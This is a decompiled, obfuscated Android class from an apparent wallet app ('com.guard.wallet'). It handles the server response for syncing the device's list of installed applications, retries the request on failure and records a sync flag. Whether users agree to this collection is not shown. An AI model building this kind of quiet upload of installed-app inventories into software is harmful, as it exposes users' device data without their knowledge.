package com.guard.wallet.http;

import a1.AbstractC0026q;
import android.util.Log;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.IOException;
import p0.InterfaceC0863e;
import p0.j0;
import p0.l0;
import p015s.C0897b;

/* renamed from: com.guard.wallet.http.s */
/* loaded from: classes.dex */
public final class C0214s implements InterfaceC0863e {
    @Override // p0.InterfaceC0863e
    /* renamed from: b */
    public final void mo389b(p0.e0 e0Var, IOException iOException) {
        AbstractC0026q.m186s("PackagesCallback", iOException);
        if (iOException instanceof C0897b) {
            return;
        }
        C0204i.m400c(e0Var.f1773c.f1777a.f1914h);
        AbstractC0207l.m441x(e0Var, this);
    }

    @Override // p0.InterfaceC0863e
    /* renamed from: d */
    public final void mo390d(p0.e0 e0Var, j0 j0Var) {
        C0204i.m400c(e0Var.f1773c.f1777a.f1914h);
        l0 l0Var = j0Var.f1835g;
        if (l0Var != null) {
            try {
                ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(l0Var.m1269z(), new TypeToken<ApiResult<Boolean>>() { // from class: com.guard.wallet.http.PackagesCallback$1
                });
                if (apiResult != null && apiResult.getSuccess().booleanValue() && ((Boolean) apiResult.getData()).booleanValue()) {
                    Log.d("PackagesCallback", "设备已安装应用同步完成");
                    AbstractC0252h.m683D(Boolean.TRUE, "syncPackages");
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("PackagesCallback", e2);
            }
        }
        j0Var.close();
    }
}
